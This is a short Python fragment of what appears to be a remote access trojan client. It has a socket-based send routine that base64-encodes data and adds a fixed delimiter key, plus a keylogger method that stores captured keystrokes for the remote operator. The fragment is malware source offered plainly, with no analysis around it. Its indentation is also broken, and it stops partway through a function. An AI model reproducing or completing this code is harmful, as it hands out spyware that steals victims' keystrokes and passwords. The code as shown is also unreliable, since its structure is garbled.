class CLIENT:

    SOCK = None
    KEY  = ")J@NcRfU"
    KEYLOGGER_STATUS = False
    KEYLOGGER_STROKES = ""

    def __init__(self, _ip, _pt):
        self.ipaddress = _ip
        self.port      = _pt
    
    def send_data(self, tosend, encode=True):
        if encode:
            self.SOCK.send(base64.encodebytes(tosend.encode('utf-8')) + self.KEY.encode('utf-8'))
        else:
            self.SOCK.send(base64.encodebytes(tosend) + self.KEY.encode('utf-8'))

    def turn_keylogger(self, status):
        def on_press(key):
            if not self.KEYLOGGER_STATUS:
                return False
        
        key = str(key)

        if len(key.strip('\'')) == 1:
            self.KEYLOGGER_STROKES += key.strip('\'')
        else:
            self.KEYLOGGER_STROKES += ("[" + key + "]")

        def on_release(key):
            if not self.KEYLOGGER_STATUS:
                return False
        